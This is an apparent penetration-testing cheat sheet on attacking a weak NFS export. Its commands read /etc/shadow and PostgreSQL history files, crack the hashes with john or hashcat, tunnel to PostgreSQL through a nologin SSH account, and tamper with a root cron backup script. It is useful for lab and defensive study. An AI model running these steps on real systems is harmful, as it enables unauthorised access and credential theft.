# NFS Insecure Mount + UNIX Socket Port Forward to PostgreSQL

An NFS export with loose permissions (world-readable, or UID spoofable) can expose sensitive files including `/etc/shadow` and service history files. When a service runs without a login shell, port-forward its UNIX socket for access.

```bash
# Mount NFS export and read sensitive files:
showmount -e <TARGET>
mount -t nfs <TARGET>:/ /mnt/nfs -o ro,nolock
ls /mnt/nfs/etc/shadow          # may be readable if no_root_squash and running as root locally
ls /mnt/nfs/var/lib/postgresql/.psql_history  # may contain queries with credentials
```

Crack shadow hash:
```bash
john --format=yescrypt /mnt/nfs/etc/shadow   # or hashcat -m7400
```

UNIX socket port forward (when SSH user exists but has no shell set, i.e. `/usr/sbin/nologin`):
```bash
# The account's shell=/usr/sbin/nologin blocks interactive SSH, but port forwarding still works
ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 <service-user>@<TARGET>
# Now connect to forwarded PostgreSQL:
psql -h 127.0.0.1 -p 5432 -U postgres
```

PostgreSQL privesc via pg_basebackup cron (if postgres user has write on cron or script):
```bash
# Check crontab for postgres user:
cat /var/spool/cron/crontabs/postgres  # or /etc/cron.d/
# If cron runs pg_basebackup as root with -Fp flag pointing to writable dir,
# modify the pre/post backup script it calls
```
